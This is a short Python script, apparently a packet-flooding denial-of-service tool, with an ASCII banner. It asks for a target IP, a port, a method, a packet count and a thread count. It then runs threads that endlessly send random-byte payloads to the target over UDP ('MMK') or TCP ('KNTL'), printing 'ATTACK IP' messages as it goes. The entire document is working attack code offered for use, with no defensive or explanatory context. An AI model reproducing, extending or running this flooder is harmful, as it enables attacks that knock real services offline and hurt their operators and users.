import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[0;36;40m")
print("""
██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░""")

ip = str(input("===] HOST/IP: "))
port = int(input("===] PORT HOST: "))
choice = str(input("=====] METHOD MMK/KNTL: "))
times = int(input("===] PACKETS: "))
threads = int(input("===] THREADS: "))

os.system('clear')
def MMK():
        data = random._urandom(1180)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(f"ATTACK IP {ip} AND PORT {port}")
                except:
                        print(f"ATTACK IP {ip} AND PORT {port}")

def KNTL():
        data = random._urandom(800)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f"ATTACK IP {ip} AND PORT {port}")
                except:
                        s.close()
                        print(f"ATTACK IP {ip} AND PORT {port}")

for y in range(threads):
    if choice == 'MMK':
        th = threading.Thread(target = MMK)
        th.start()
    elif choice == 'KNTL':
        th = threading.Thread(target = KNTL)
        th.start()
